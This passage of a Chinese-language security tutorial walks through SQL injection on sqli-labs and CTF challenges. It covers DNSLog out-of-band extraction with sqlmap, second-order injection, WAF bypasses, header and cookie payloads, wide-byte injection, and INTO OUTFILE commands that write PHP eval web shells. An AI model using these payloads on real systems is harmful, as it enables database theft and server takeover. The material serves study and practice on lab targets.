f.read()</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">data = json.loads(json_data)</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">for i in data:</span><br><span class=\"line\">    data_list.append(i[&#x27;name&#x27;].replace(url,&#x27;&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = list(set(data_list))</span><br><span class=\"line\">for i in data_list:</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<p>可以去重以后打印出刚才获取的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png\" alt=\"img\"></p>\n<h5 id=\"dnslog配和sqlmap进行注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog配和sqlmap进行注入\">#</a> DNSLog 配和 Sqlmap 进行注入</h5>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png\" alt=\"image-20220308110248704\"></p>\n<p>MX 记录优先级高于 A 记录</p>\n<p>泛域名、泛解析：*.baidu.com 解析全部子域名</p>\n<p>1. 安装 dns 服务器</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525161508227.png\" alt=\"在这里插入图片描述\"></p>\n<p>点击下一步，勾选 dns 服务器</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525161633827.png\" alt=\"在这里插入图片描述\"></p>\n<p>连续下一步，之后点击安装，等待安装…<br>\n 安装完成之后在开始管理工具中选择 dns 管理器<br>\n右键，属性</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162032613.png\" alt=\"在这里插入图片描述\"></p>\n<p>在监视中对测试类型打钩</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2020052516213329.png\" alt=\"在这里插入图片描述\"></p>\n<p>在正常查找区域中右键选择新建区域</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162229974.png\" alt=\"在这里插入图片描述\"></p>\n<p>设置新建区域名称</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162320546.png\" alt=\"在这里插入图片描述\"></p>\n<p>继续默认下一步就可以<br>\n进入我们设置的域名，右键，新建主机（A 记录）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162549151.png\" alt=\"在这里插入图片描述\"></p>\n<p>设置域名，这里的 ip 地址为 kali 的 ip</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162723189.png\" alt=\"在这里插入图片描述\"></p>\n<p>继续添加泛解析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525162842913.png\" alt=\"在这里插入图片描述\"></p>\n<p>添加转发</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200525184140431.png\" alt=\"在这里插入图片描述\"></p>\n<p>修改靶机 dns 服务器为刚刚设置的 dns 服务器</p>\n<p>sqlmap 进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://xx.xx.xx.xx/index.php?id=1&quot; --technique=T --dns-domain &quot;oupeng.top&quot; -D security --tables</span><br></pre></td></tr></table></figure>\n<p>上述 sqlmap 命令作用：使用 ouepng.top 作为外带的网址。假设有台设备，kali (172.16.60.166),DNS Server (172.16.60.222), 目标靶机 (172.16.60.250)</p>\n<p>kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 oupeng.top。由于靶机上 DNS 解析使用的是 222，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 oupeng.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果</p>\n<p>DNSLog+Sqlmap 注入过程详解：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png\" alt=\"image-20220308114540681\"></p>\n<h5 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h5>\n<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>\n<p><strong>二次注入，可以概括为以下两步:</strong></p>\n<ul>\n<li>第一步：插入恶意数据<br>\n进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>\n<li>第二步：引用恶意数据<br>\n开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>\n</ul>\n<p>（1）在 sqli_libs 的第 24 关，其页面如下所示:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png\" alt=\"img\"></p>\n<p>（2）当我们点击 Forgot your password? 时，出现提示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png\" alt=\"img\"></p>\n<p>（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png\" alt=\"img\"></p>\n<p>（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png\" alt=\"img\"></p>\n<p>（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png\" alt=\"img\"></p>\n<p>下面简单对代码进行一下分析：<br>\n1. 注册模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class=\"line\">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br><span class=\"line\">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class=\"line\">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 <code>admin'#</code></p>\n<p>顺便插一句嘴，解释两个函数：</p>\n<p>mysql_escape_string 使用该函数对字符转义后插入数据库中会去除转义字符</p>\n<p>mysql_real_escape_string  使用该函数对字符转义后插入数据库中会保留转义字符</p>\n<p>因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。</p>\n<p>利用这个，我们创建用户 admin’#，然后用该用户登录</p>\n<p>登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据</p>\n<p>在 pass_change.php 中代码如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($pass==$re_pass)</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class=\"line\">\t$res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class=\"line\">\t$row = mysql_affected_rows();</span><br></pre></td></tr></table></figure>\n<p>用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=admin&#x27;# and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码</p>\n<p>于是二次注入产生</p>\n<h5 id=\"二次注入相关的ctf-game\"><a class=\"markdownIt-Anchor\" href=\"#二次注入相关的ctf-game\">#</a> 二次注入相关的 CTF GAME</h5>\n<p>1.git 泄露</p>\n<p>git add   // 提交到缓冲区</p>\n<p>git commit -m // 提交到本地仓库</p>\n<p>git push  // 提交到远端仓库</p>\n<p>当 git 泄露时可以通过 githack 还原文件</p>\n<p>git log --reflog 可以查看提交记录</p>\n<p>通过 git reset --hard 更改指针位置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>[网鼎杯 2018] Comment</p>\n<p>2.PHP:filter</p>\n<!--?file=?--> 接收get传入的file参数，用php伪协议读源码\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>\n<p>修改地址存在二次注入，从数据库中取 old_address 时没有过滤</p>\n<p>[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)</p>\n<h5 id=\"带有waf过滤的sql注入\"><a class=\"markdownIt-Anchor\" href=\"#带有waf过滤的sql注入\">#</a> 带有 WAF 过滤的 SQL 注入</h5>\n<p>1. 过滤 and、or</p>\n<p>在过滤一遍的场景下可以尝试双写，大小写</p>\n<p><em>在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。</em></p>\n<p>或者使用逻辑运算符，使用 || 代替 or，&amp;&amp; 代替 and，但需要对 &amp;&amp; 进行编码 %26%26，URLcode 不用对 || 编码</p>\n<p>2. 过滤空格</p>\n<p>使用 /**/ 多行注释代替</p>\n<p>%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)</p>\n<p>使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username=admin&amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n<p>3. 过滤注释</p>\n<p>如果用单引号闭合，使用 and’1’='1 代替注释</p>\n<p>使用；%00 截断</p>\n<p>4.union select 过滤</p>\n<p>uniunion selecton select</p>\n<p>5. 过滤 =</p>\n<p>like</p>\n<p>regexp</p>\n<h5 id=\"referer注入\"><a class=\"markdownIt-Anchor\" href=\"#referer注入\">#</a> referer 注入</h5>\n<p>通过 referer 字段不严格的过滤产生注入</p>\n<p>phpcmsv9 存在 referer 注入</p>\n<p>sqllab pass-19</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png\" alt=\"image-20220311175006708\"></p>\n<p>通过闭合确定 referer 存在注入</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>构造如下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) )#</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>注意题目源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class=\"line\">闭合时需要在闭合一个括号</span><br></pre></td></tr></table></figure>\n<h5 id=\"user-agent注入\"><a class=\"markdownIt-Anchor\" href=\"#user-agent注入\">#</a> user-agent 注入</h5>\n<p>参考 sqllab 第 18 关</p>\n<p>1. 关于 sql 参数过滤，check_input 用于检查输入的内容。</p>\n<p>第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符</p>\n<p>如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>s</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">value = stripslashes(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_input($value)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tif(!empty($value))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t// truncation (see comments)</span><br><span class=\"line\">\t\t$value = substr($value,0,20);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Stripslashes if magic quotes enabled</span><br><span class=\"line\">\t\tif (get_magic_quotes_gpc())</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = stripslashes($value);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Quote if not a number</span><br><span class=\"line\">\t\tif (!ctype_digit($value))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t$value = intval($value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\treturn $value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数据库中接收参数的语句为 </span><br><span class=\"line\">\t$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class=\"line\">\t$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png\" alt=\"image-20220311173048631\"></p>\n<p>0. 数据库中闭合语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>\n<p>最终 payload 有两种形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) )#</span><br><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐</span><br></pre></td></tr></table></figure>\n<p>也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的</p>\n<h5 id=\"cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入\">#</a> cookie 注入</h5>\n<p>通过没有过滤 cookie 字段的值产生的 cookie 注入</p>\n<p>sqllab pass-20</p>\n<p>注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie</p>\n<p>验证存在注入：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png\" alt=\"image-20220311175929845\"></p>\n<p>进行注入：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png\" alt=\"image-20220311180121906\"></p>\n<p>最终构造的 paylaod 为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>不加 <code>)</code>  的原因是他的查询语句长这样：</p>\n<p>​      <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mo>∗</mo><mi>F</mi><mi>R</mi><mi>O</mi><mi>M</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>W</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></mrow><annotation encoding=\"application/x-tex\">sql=&quot;SELECT * FROM users WHERE username=&#x27;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span>cookee’ LIMIT 0,1&quot;;</p>\n<p>你只需要闭合 <code>'</code>  不再需要闭合 <code>)</code></p>\n<h5 id=\"post注入\"><a class=\"markdownIt-Anchor\" href=\"#post注入\">#</a> post 注入</h5>\n<p>通过 post 提交的参数中注入</p>\n<p>postman,hackbar,burpsuite 可以提交 post 参数</p>\n<p>sqli - less11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=-1&#x27; union select 1,2#&amp;passws=1111</span><br></pre></td></tr></table></figure>\n<p>sqlmap 两种形式</p>\n<p>1. 将 http 请求包放入 txt 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 1.txt</p>\n<p>2.sqlmap -u URL --data “”</p>\n<h5 id=\"sql读写文件注入\"><a class=\"markdownIt-Anchor\" href=\"#sql读写文件注入\">#</a> SQL 读写文件注入</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select into outfile  导出数据</span><br><span class=\"line\">?id=-1&#x27; union select &lt;?php eval($_POST[&#x27;C&#x27;]);?&gt; into outfile E:/web.php</span><br><span class=\"line\"></span><br><span class=\"line\">outfile 导出条件</span><br><span class=\"line\">root权限</span><br><span class=\"line\">GPC关闭（能使用单引号)</span><br><span class=\"line\">有绝对路径（读文件可以不用，写文件必须)</span><br><span class=\"line\">没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27;)) union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &#x27;网站物理路径&#x27; --+</span><br><span class=\"line\">less-7/demo.php</span><br><span class=\"line\">?id=1&#x27;)) union select 1,2, &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; into outfile &quot;D:/Phpstudy/PHPTutorial/test1.php --+</span><br><span class=\"line\">写马的时候必须使用字符串</span><br></pre></td></tr></table></figure>\n<h5 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h5>\n<p>导致原因： <code>mysql_query(&quot;set names gbk&quot;)</code>  错误使用了编码方式 gbk</p>\n<p>在 GBK 下一个汉字占两个字节，UTF-8 占三个字节</p>\n<p>注意关闭 magic_quotes_qpc</p>\n<p>我们这里的宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字 (前 — 个 ascii 码要大于 128，才到汉字的范围)。如果我们输入 % df 看会怎样:</p>\n<p>这就是 mysql 的特性，因为 gbk 是多字节编码，他认为两个字节代表一个汉字，所以 % df 和后面的转义单引号的 \\ 也就是 % df%5c 变成了一个汉字 &quot; 踵”，而逃逸了出来。</p>\n<p>使用 % a1 也可以，只要第一个字节 ASCII&gt;128，基本就可以被认为宽字节，不一定要组成汉字</p>\n<p>sqllab less-32</p>\n<p>注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png\" alt=\"image-20220316223957869\"></p>\n<p>gbk 与 gb2312</p>\n<p>gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 <code>0xA1~0xFE</code> ，而 <code>\\</code>  是 0x5c，是不在低位范围中的。所以， <code>0x5c</code>  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。</p>\n<p>所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有 <code>0x5c</code>  